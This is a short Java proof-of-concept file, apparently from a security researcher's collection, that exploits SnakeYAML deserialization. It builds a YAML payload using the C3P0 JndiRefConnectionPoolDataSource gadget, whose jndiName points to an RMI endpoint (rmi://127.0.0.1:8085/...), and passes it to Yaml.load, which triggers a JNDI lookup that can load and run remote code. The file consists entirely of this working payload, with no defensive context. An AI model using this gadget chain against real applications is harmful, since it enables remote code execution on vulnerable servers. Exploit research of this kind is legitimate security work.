package com.yyjccc.yaml;

import org.yaml.snakeyaml.Yaml;

public class C3P0 {
	public static void main(String[] args) {
		String poc="!!com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource {jndiName: \"rmi://127.0.0.1:8085/RFKMphyY\", loginTimeout: \"2\"}";
		System.out.println(poc);
		Yaml yaml = new Yaml();
		yaml.load(poc);

	}
}
